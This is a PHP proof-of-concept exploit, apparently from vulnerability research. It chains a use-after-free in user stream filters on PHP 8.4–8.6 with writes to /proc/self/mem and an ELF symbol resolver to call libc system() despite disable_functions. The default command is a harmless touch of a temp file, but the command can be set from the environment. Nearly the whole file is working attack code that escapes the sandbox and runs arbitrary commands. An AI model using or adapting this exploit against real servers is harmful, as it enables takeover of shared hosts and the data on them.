<?php
/**
 * Pure-PHP libc symbol resolver: parses the ELF dynamic symbol table of the
 * loaded libc and returns the runtime address of a symbol. No shell, no nm,
 * no exec family. Works under disable_functions.
 */
function elf_resolve_symbol(string $sym): int {
    // locate libc path + load base from maps
    $libc_path = null; $base = null;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
        if (strpos($l, 'libc.so.6') === false) continue;
        if (preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\S+\s+(\S+)/', $l, $m)) {
            if ($m[3] === '00000000') { $base = hexdec($m[1]); $libc_path = $m[4]; break; }
        }
    }
    if (!$libc_path || $base === null) return 0;

    $f = fopen($libc_path, 'rb');
    if (!$f) return 0;

    $hdr = fread($f, 64);
    if (strlen($hdr) < 64 || substr($hdr, 0, 4) !== "\x7fELF") { fclose($f); return 0; }
    $phoff = unpack('P', substr($hdr, 0x20, 8))[1];
    $phentsize = unpack('v', substr($hdr, 0x36, 2))[1];
    $phnum = unpack('v', substr($hdr, 0x38, 2))[1];

    // find PT_DYNAMIC
    $dyn_off = 0; $dyn_sz = 0;
    fseek($f, $phoff);
    for ($i = 0; $i < $phnum; $i++) {
        $ph = fread($f, $phentsize);
        if (strlen($ph) < $phentsize) break;
        $ptype = unpack('V', substr($ph, 0, 4))[1];
        if ($ptype === 2) { // PT_DYNAMIC
            $dyn_off = unpack('P', substr($ph, 0x08, 8))[1];
            $dyn_sz = unpack('P', substr($ph, 0x20, 8))[1];
            break;
        }
    }
    if (!$dyn_off) { fclose($f); return 0; }

    // parse dynamic table
    $strtab = 0; $symtab = 0; $strsz = 0; $syment = 24;
    fseek($f, $dyn_off);
    $dyn = fread($f, $dyn_sz);
    for ($o = 0; $o + 16 <= strlen($dyn); $o += 16) {
        $tag = unpack('P', substr($dyn, $o, 8))[1];
        $val = unpack('P', substr($dyn, $o + 8, 8))[1];
        if ($tag === 0) break;
        if ($tag === 5) $strtab = $val;
        if ($tag === 6) $symtab = $val;
        if ($tag === 10) $strsz = $val;
        if ($tag === 11) $syment = max(24, $val);
    }
    if (!$strtab || !$symtab) { fclose($f); return 0; }

    // walk symbols from symtab until strtab; check names
    $count = intdiv($strtab - $symtab, $syment);
    if ($count <= 0 || $count > 200000) $count = 20000;
    fseek($f, $symtab);
    $buf = fread($f, $count * $syment);
    for ($i = 0; $i < $count; $i++) {
        $e = substr($buf, $i * $syment, $syment);
        $st_name = unpack('V', substr($e, 0, 4))[1];
        $st_value = unpack('P', substr($e, 0x08, 8))[1];
        if (!$st_name || !$st_value) continue;
        fseek($f, $strtab + $st_name);
        $name = '';
        while (true) {
            $c = fread($f, 1);
            if ($c === '' || $c === "\x00" || strlen($name) > 64) break;
            $name .= $c;
        }
        if ($name === $sym) { fclose($f); return $base + $st_value; }
    }
    fclose($f);
    return 0;
}

/**
 * #7 hardened variant (v8): runs under disable_functions (full cPanel-style list).
 * libc system/abort resolved by pure-PHP ELF .dynsym parsing (elf_resolve_symbol)
 * - no shell_exec, no nm, no exec family anywhere in this PoC.
 * Chain (stock 8.4/8.5/8.6): user-filter self-remove UAF -> post-callback
 * zend_update_property_null reads the freed chunk's abstract slot as a direct
 * zend_object* -> full-bin string reclaim -> /proc/self/mem patches abstract
 * = obj-host (kept string: cmd@data+0, handlers ptr@data+0x18) -> handlers
 * table in beaconed big string, write_property = fn -> system(cmd) / abort.
 */
echo "PHP=".PHP_VERSION." SAPI=".PHP_SAPI."\n";
try { FFI::cdef('void abort(void);'); echo "FFI_AVAILABLE (unexpected)\n"; }
catch (Throwable $e) { echo "FFI_BLOCKED ok\n"; }

$TARGET = getenv('F7_TARGET') ?: 'system';
$CMD    = getenv('F7_CMD') ?: "touch /tmp/F7N7";

$php_base = null;
foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
    if (str_contains($l, '/usr/local/bin/php') && preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000/', $l, $m)) {
        $php_base = hexdec($m[1]); break;
    }
}
$libc_base = null;
foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
    if (str_contains($l, 'libc.so.6') && preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+r-xp\s+([0-9a-f]+)/', $l, $m)) {
        $libc_base = hexdec($m[1]) - hexdec($m[2]); break;
    }
}
$sym = ($TARGET === 'abort') ? 'abort' : 'system';
$fn = elf_resolve_symbol($sym);
if (!$php_base || !$fn) { fwrite(STDERR, "NO_BASES\n"); exit(2); }
echo sprintf("php=0x%x fn(%s)=0x%x\n", $php_base, $sym, $fn);
fflush(STDOUT);

const BIG = 2048;
const P1_OFF    = 128;
const OBJ_OFF   = 256;
const TABLE_OFF = 512;
const MAGIC = "F7V7_BIG_MAGIC_BEACON__";
$big = str_repeat("\x43", BIG);
$big = substr_replace($big, MAGIC, BIG - 32, strlen(MAGIC));
$GLOBALS['big'] = $big;

$mem = fopen('/proc/self/mem', 'r+b');
if ($mem === false) { fwrite(STDERR, "NO_MEM\n"); exit(2); }

$big_data = 0;
foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
    if ($big_data) break;
    if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p/', $l, $m)) continue;
    $a = hexdec($m[1]); $b = hexdec($m[2]);
    if ($b - $a > 64 * 1024 * 1024) continue;
    if (fseek($mem, $a) !== 0) continue;
    $chunk = @fread($mem, $b - $a);
    if ($chunk === false || $chunk === '') continue;
    $p = strpos($chunk, MAGIC);
    if ($p !== false) { $big_data = $a + $p - (BIG - 32); break; }
}
if (!$big_data) { fwrite(STDERR, "NO_BEACON\n"); exit(2); }

$table = $big_data + TABLE_OFF;
$p1    = $big_data + P1_OFF;
// fake object lives in a KEPT special string: data[0]=cmd, data[0x18]=table ptr (set at creation)
$MAGIC2 = "F7V7_OBJHOST_MAGIC_2_";
$cmdPad = substr($CMD . "\x00", 0, 0x18);
$cmdPad = $cmdPad . str_repeat("\x00", 0x18 - strlen($cmdPad));
$special = $cmdPad . pack('P', $table) . $MAGIC2 . str_repeat('E', 16);
$GLOBALS['special'] = $special;
foreach ([0x20, 0x28, 0x30] as $woff) {
    fseek($mem, $table + $woff); fwrite($mem, pack('P', $fn)); // write_property (any offset)
}
fseek($mem, $table + 0x30); $v3 = unpack('P', fread($mem, 8))[1];
echo sprintf("big=0x%x p1=0x%x table=0x%x wp=0x%x ok=%s\n",
    $big_data, $p1, $table, $v3, ($v3 === $fn) ? 'YES' : 'NO');
fflush(STDOUT);

$GLOBALS['did'] = 0; $GLOBALS['fp'] = null; $GLOBALS['keep'] = [];
$GLOBALS['table'] = $table; $GLOBALS['mem'] = $mem; $GLOBALS['magic2'] = $MAGIC2;
// pre-cache rw-p regions (avoids file() allocations inside the callback hot window)
$regions = [];
foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
    if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p/', $l, $m)) {
        $a = hexdec($m[1]); $b2 = hexdec($m[2]);
        if ($b2 - $a <= 64 * 1024 * 1024) $regions[] = [$a, $b2];
    }
}
$GLOBALS['regions'] = $regions;

class F extends php_user_filter {
    function filter($in, $out, &$consumed, $closing): int {
        if (!$closing && !$GLOBALS['did']) {
            $GLOBALS['did'] = 1;
            @stream_filter_remove($GLOBALS['fres']);
            // full-bin sweep: fresh kept strings across all small bins
            $pT = pack('P', 0x5f3759df5f3759df);
            $pM = pack('P', 0x1357246813572468);
            $core = $pT . $pM;
            $lens = [20,24,28,32,36,40,44,48,52,56,60,64,68,72,76,80];
            foreach ($lens as $L) {
                $fill = str_repeat('D', $L - 17);
                for ($i = 0; $i < 1500; $i++) {
                    $GLOBALS['keep'][] = $core . $fill . 'z';
                }
            }
            while ($b = stream_bucket_make_writeable($in)) {
                $consumed += $b->datalen;
                stream_bucket_append($out, $b);
            }
            // scan SAVED regions (no file() allocations in the hot window)
            $mem = $GLOBALS['mem'];
            $needle = $pT . $pM;
            $cands = [];
            foreach ($GLOBALS['regions'] as $r) {
                $a = $r[0]; $b2 = $r[1];
                if (fseek($mem, $a) !== 0) continue;
                $chunk = @fread($mem, $b2 - $a);
                if ($chunk === false || $chunk === '') continue;
                $pos = 0;
                while (($p = strpos($chunk, $needle, $pos)) !== false) {
                    $cands[] = $a + $p - 0x18;
                    $pos = $p + 8;
                }
            }
            $cands = array_values(array_unique($cands));
            echo "CANDS n=".count($cands)."\n"; fflush(STDOUT);
            // locate the obj-host string via [table-ptr][magic2] — unique (needle string alone lacks the ptr)
            $obj = 0;
            $needle2 = pack('P', $GLOBALS['table']) . $GLOBALS['magic2'];
            foreach ($GLOBALS['regions'] as $r) {
                $a = $r[0]; $b2 = $r[1];
                if (fseek($mem, $a) !== 0) continue;
                $chunk = @fread($mem, $b2 - $a);
                if ($chunk === false || $chunk === '') continue;
                $p = strpos($chunk, $needle2);
                if ($p !== false) { $obj = $a + $p - 0x18; break; }
            }
            echo sprintf("OBJ=0x%x\n", $obj); fflush(STDOUT);
            if (!$obj) { echo "NO_OBJ\n"; return PSFS_PASS_ON; }
            // direct path: candidates +8 = obj-host data (cmd@0, handlers@0x18)
            $pP1 = pack('P', $obj);
            foreach ($cands as $c) {
                if (fseek($mem, $c + 8) === 0) fwrite($mem, $pP1);
            }
            echo "PATCHED\nRESUME\n"; fflush(STDOUT);
        } else {
            while ($b = stream_bucket_make_writeable($in)) {
                $consumed += $b->datalen;
                stream_bucket_append($out, $b);
            }
        }
        return PSFS_PASS_ON;
    }
}

stream_filter_register('myf', 'F');
$fp = fopen('php://memory', 'w+b');
$GLOBALS['fp'] = $fp;
fwrite($fp, 'xy');
rewind($fp);
$GLOBALS['fres'] = stream_filter_append($fp, 'myf', STREAM_FILTER_READ);
echo "READ\n"; fflush(STDOUT);
@stream_get_contents($fp);
echo "SURVIVED_NO_FIRE\n";
